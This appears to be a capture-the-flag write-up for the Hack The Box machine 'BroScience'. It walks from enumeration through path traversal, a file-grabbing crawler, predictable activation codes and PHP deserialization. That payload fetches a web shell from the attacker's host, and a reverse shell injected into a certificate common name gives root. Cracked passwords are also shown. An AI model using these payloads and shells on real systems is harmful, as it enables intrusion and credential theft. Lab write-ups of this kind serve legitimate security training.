ip: 10.10.11.195
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/broscience 10.10.11.195

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| tls-alpn: 
|_  http/1.1
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hostname of broscience.htb.

## Webapp.
Looking at the page there is a get parameter pulling a page. Tried sql injection but didn't get anything back.

Also includes a path for an img.
```http
GET /includes/img.php?path=bench.png HTTP/1.1
```

Sending `../` gives `attack detected` URL encoding?

```http
GET /includes/img.php?path=..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
```

This works!

You can also use this to pull the backend code.

Going to build a quick python crawler to grab all the files.

# Python web crawler
```python
import requests
import urllib3
import re
from pathlib import Path

urllib3.disable_warnings()

queue = ["index.php"]
seen = []

url = 'http://broscience.htb/includes/img.php?path=..%252f'

def save_file(name,contents):
    
    if '/' in name:

        fdir = Path(name)
        Path(fdir.parents[0]).mkdir(parents=True, exist_ok=True)

    with open(name, 'wb') as f:
        
        f.write(contents)

while len(queue)!=0:

    for page in queue:
    
        queue.remove(page)
        seen.append(page)

        r = requests.get(url + page,verify=False)
        save_file(page,r.content)
        pages = re.findall(r"['\"]([a-zA-Z0-9-_/]*.php)",r.text)

        for i in pages:
            
            if i not in seen and i not in queue:
            
                if i[0] == "/":
                    i = i[1:]
            
                queue.append(i)

```

# Source code analysis
In the `utils.php` file there could be a unserialization thingy:
```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
```

Can also generate our own activation codes.
```php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

Lets do that real quick.

# User login
Going to make a new user and capture request in burp so we get the time stamp.
```json
Date: Thu, 13 Apr 2023 08:45:04 GMT
```


```php
<?php
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(strtotime('Date: Thu, 13 Apr 2023 08:45:04 GMT'));
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
    echo "\n";
?>

s0poBxr66rpgq4iUGg5BKjlsALfBncZi
```

And going to `active.php?code=s0poBxr66rpgq4iUGg5BKjlsALfBncZi` activates the account.

# PHP deserilisation
From here we can change the theme which has that serialised cookie.
```php
O:9:"UserPrefs":1:{s:5:"theme";s:4:"dark";}
```

To get this to work we need a public `__wakeup` or `__destruct` method.

There is a `__wakeup` in the AvatarInterface object.
```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}


```

Going to change the avatarinterface a tiny bit so we get code exec.
```php
class AvatarInterface {
    public $tmp = 'http://10.10.14.30/eljay.php';
    public $imgPath = './eljay.php';

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
$payload = serialize(new AvatarInterface);
echo $payload . "\n";
?>
O:15:"AvatarInterface":2:{s:3:"tmp";s:28:"http://10.10.14.30/eljay.php";s:7:"imgPath";s:11:"./eljay.php";}
```

where `eljay.php` is:
```php
<?php
system($_REQUEST['cmd']);
?>
```

Changing the cookie and sending it across writes the file.


So just send a rev shell in a post request and ta da! Shell on the box.

# Foothold as www-data
Pull data from the db using creds in the db_connect file.
```
psql -U dbuser -W -h localhost broscience
```

The hashes are prepended with a salt of NaCl (lol nice) as shown in that db connect file.

Cracking the hashes gives a few pwds (without the salt):
```
administrator:15657792073e8a843d4f91fc403454e1
bill:13edad4932da9dbb57d9cd15b66ed104:iluvhorsesandgym
michael:bd3dad50e2d578ecba87d5fa15ca5f85:2applesplus2apples
john:a7eed23a7be6fe0d765197b1027453fe
dmytro:5d15340bded5b9395d5d14b9c21bc82b:Aaronthehottest
```


Checking /etc/passwd shows that bill is a user on the box.

# Shell as Bill
User.txt
```
e83150f17da6a66d4c58b3cafa0742b1
```

Running pspy as there is an empty cert folder that could be used for something.

There is this file being run as root:
```bash
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;

```

So there is code exec on the commonName parameter.

Copy how the cert is made:
```
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
```

and add a payload to the common name field.
```
$(bash -i >& /dev/tcp/10.10.14.30/9001 0>&1)
```

This works and gives a root shell. :)

root.txt:
```
172772a1121b3c91e93382375d7826c7
```